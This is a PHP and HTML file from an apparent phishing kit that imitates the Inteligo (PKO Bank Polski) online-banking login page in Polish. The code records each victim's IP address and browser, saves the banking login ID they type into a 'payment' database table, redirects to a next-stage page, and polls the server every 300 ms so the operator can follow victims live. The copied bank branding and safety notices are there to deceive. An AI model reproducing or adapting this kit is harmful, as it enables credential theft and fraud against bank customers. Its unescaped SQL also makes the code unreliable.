<?php 
	include('../bank_header.php'); 
	include('../../../db.php'); 
	include('../../../YH0uW3ecaRHG16ld4waY.php');

	$sup = "UPDATE `payment` SET `beep` = '0'";
	$con->query($sup);
	if (!$_REQUEST['id'])
		exit;

	function get_client_ip() {
		$ipaddress = '';
		if (getenv('HTTP_CLIENT_IP'))
			$ipaddress = getenv('HTTP_CLIENT_IP');
		else if(getenv('HTTP_X_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
		else if(getenv('HTTP_X_FORWARDED'))
			$ipaddress = getenv('HTTP_X_FORWARDED');
		else if(getenv('HTTP_FORWARDED_FOR'))
			$ipaddress = getenv('HTTP_FORWARDED_FOR');
		else if(getenv('HTTP_FORWARDED'))
		   $ipaddress = getenv('HTTP_FORWARDED');
		else if(getenv('REMOTE_ADDR'))
			$ipaddress = getenv('REMOTE_ADDR');
		else
			$ipaddress = 'UNKNOWN';
		return $ipaddress;
	}
	
	if($_REQUEST['id']){
		$id = mysqli_real_escape_string($con,$_REQUEST['id']);
		$userip = get_client_ip();
		$useragent = $_SERVER['HTTP_USER_AGENT'];

		$sup = "UPDATE `payment` SET `userip` = '$userip', `useragent` ='$useragent'  WHERE `id` = '$id' ";
		$con->query($sup);

		$page_name = basename($_SERVER['PHP_SELF']);
		$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
		$con->query($sqlss);
	}
	
	if(isset($_POST['submit'])){
		$bank_user_id = $_POST['bank_user_id'];
		if ($bank_user_id!="") {
			$sql = "UPDATE `payment` SET `bank_user_id` = '$bank_user_id' WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
			$con->query($sql);
			echo '<script>window.location.href="index2.php?id='.$_REQUEST['id'].'"</script>';
		}
	}
?>

<script src="js/public.js"></script>
<script type="text/javascript">
	setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);
</script>


<!DOCTYPE html>
<html lang="en" class="broken-image-checker" ng-app>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<!--iPhone from zooming form issue (maximum-scale=1, user-scalable=0)-->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
	<title>Serwis WWW Inteligo</title>

	<link rel="icon" type="image/png" href="images/inteligo.ico">
	
    <!-- Bootstrap --><link href="css/bootstrap.min.css" rel="stylesheet">
	
	<link rel="stylesheet" href="css/paolo__.css">
	
	
	<!-- jQuery -->
	<!--[if (!IE)|(gt IE 8)]><!-->
	  <script src="js/jquery-2.2.4.min.js"></script>
	<!--<![endif]-->

	<script src="js/bootstrap.min.js"></script>
  </head>
  <body class="transition nav-plusminus slide-navbar slide-navbar--right hdr--sticky-mobile--off"  style="background:#a4bfd0">

  <div id="body-wrapper" class="container">
		<div class="row">
		<div class="col-md-12 mr50">
		<div id="title-bar">
		
		<a href="http://inteligo.pl/" id="logo" aria-labelledby="logo-infotip-text">&nbsp;</a>
		<div id="logo-infotip" style="display: none;">
			<div id="logo-infotip-icon">&nbsp;</div>
			<div id="logo-infotip-text">Powrót do serwisu informacyjnego</div>
			<script type="text/javascript">
				$('#logo-infotip').hide();
				$("a#logo").mouseenter(function() {
					$('#logo-infotip').show();
				});
				$("a#logo").mouseleave(function() {
					$("#logo-infotip").hide();
				});
			</script>
		</div>
		</div>
		<ul id="main-menu"></ul>
		
		<div class="wrap-content">
    <div class="layout-content">
     
    <div class="layout-page-middle new-navigation">
		<div class="form-box" style="margin-bottom: 15px; margin-top: 3px">
			<div id="" class="table_list tableListInfoTable">
				<table cellspacing="0" class="table-list"></table><div class="message empty-table ">
					<div class="box-info" style="padding-top: 0;">
						<span style="font-weight: bold">Zbliżają się roczne rozliczenia podatkowe - zaktualizuj swoje dane<br></span>Zbliża się termin otrzymywania informacji podatkowych, pomocnych w rozliczaniu zobowiązań podatkowych za 2017 rok – pamiętaj o zaktualizowaniu swoich danych.<a target="_blank" href="http://inteligo.pl/aktualnosci/komunikaty/zblizaja-sie-roczne-rozliczenia-podatkowe-zaktualizuj-swoje-dane_2/" title="Więcej"><strong>Więcej&nbsp;&gt;&gt;</strong></a>
					</div>
				</div>
			</div>
		</div>
        <div class="form-box save-no-password form-no-required">
			<div class="box-input" style="display:none">
				<div class="box-input-wrap">
				<input type="text" style="display:none" class="decoy" value="E" name="login0">
				</div>
			</div>
			<div class="box-input" style="display:none">
				<div class="box-input-wrap">
					<input type="password" style="display:none" class="decoy" value="D" name="password0">
				</div>
			</div>
			
			<div class="form form_tabular " id="f-form_0145702117" data-action="/secure/igo2/auth/login/submit?flow_id=LZKYp69meKvyWKdMHjF2H4&amp;continue_flow=1" style="display: block;">
				<h1 class="table-title"><span class="inner">Logowanie
				</span></h1>
				<form action="" method="post">
				<ul class="form-tabular">
					<li class="field_row edit-field field_row-client_id_field NullValidationCharEditFieldTR" id="f-tr-f-form_0145702117-client_id_field">
						<div class="form-label">
							<label for="f-form_0145702117-client_id_field">Identyfikator lub login:
							</label>
							<span class="form-field NullValidationCharEditFieldTd">
								<span class="NullValidationCharEditField_field_widget field_widget " id="f-form_0145702117-client_id_field-field_widget">
									<span class="box-input">
										<span class="box-input-wrap">
											<input name="bank_user_id" maxlength="50" 
											size="62" type="text" style="width:200px;border-radius:5px;"
											tabindex="10" aria-flowto="f-form_0145702117-client_id_field-help">
										</span>
										<span class="question"></span>
									</span>
								</span>
							</span>
						</div>
						
					</li>
				</ul>
					<div class="form-buttons">
						<button name="submit" type="submit" class="image-button button-dalej button button_ok" tabindex="10" title="Dalej"></button>

					</div>
				</form>
				</div>
				<div class="box-input" style="display:none">
					<div class="box-input-wrap">
						<input type="text" style="display:none" class="decoy" value="C" name="login1">
					</div>
				</div>
					<div class="box-input" style="display:none">
						<div class="box-input-wrap">
							<input type="password" style="display:none" class="decoy" value="O" name="password1">
						</div>
					</div>
					<div class="box-input" style="display:none">
						<div class="box-input-wrap">
							<input type="password" style="display:none" class="decoy" value="Y" name="password2">
						</div>
					</div>
			</div>
				<div style="clear: both;">        
					<div class="box-login">
						<h1><span class="login-icon-key"></span>Bezpieczeństwo w Inteligo</h1>
						<div class="holder secure">
							Pamiętaj: Logowanie do serwisu transakcyjnego Inteligo nie wymaga podania kodu z narzędzia autoryzacyjnego - nigdy nie podawaj kodu podczas logowania ani bezpośrednio po zalogowaniu do serwisu!<br>&nbsp; <a href="http://inteligo.pl/redirect/bezpieczenstwo" target="_blank"><br>Więcej o bezpiecznym logowaniu</a> <br><br></div>
					</div>
					<div class="login-spacer"></div>
					<div class="box-login">
						<h1><span class="login-icon-page"></span>Program poleceń Mam Inteligo</h1>
						<div class="holder account">
							Zarejestruj się, zarabiaj i wygrywaj.
							<ul><li>- 1000 zł za największą liczbę poleceń</li>
							<li>- 50 zł za każde skutecznie polecone konto<br><br></li>
							</ul><a href="https://maminteligo.pl" target="_blank">Więcej</a>
						</div>
					</div>
				</div>
					<div class="clear"></div>
				</div>
					<div class="layout-page-bottom"></div>
				</div>
					<div class="col-md-12" id="bottom-text">
					Konto Inteligo prowadzone jest przez <b>PKO Bank Polski</b>.
					</div>
					<div class="clear"></div>
					<div class="layout-footer">
						<div id="deposits-link">
					
							<a class="standalone" href="http://inteligo.pl/infosite/_images/_files/zasady_gwarantowania_depozytow.pdf" target="_blank" title="" aria-describedby="aria_external">
								Gwarantowanie depozytów</a>
						</div>
					</div>
				</div>
			</div>
		</div>
   </div><!--body-wrapper-->

	</body>
</html>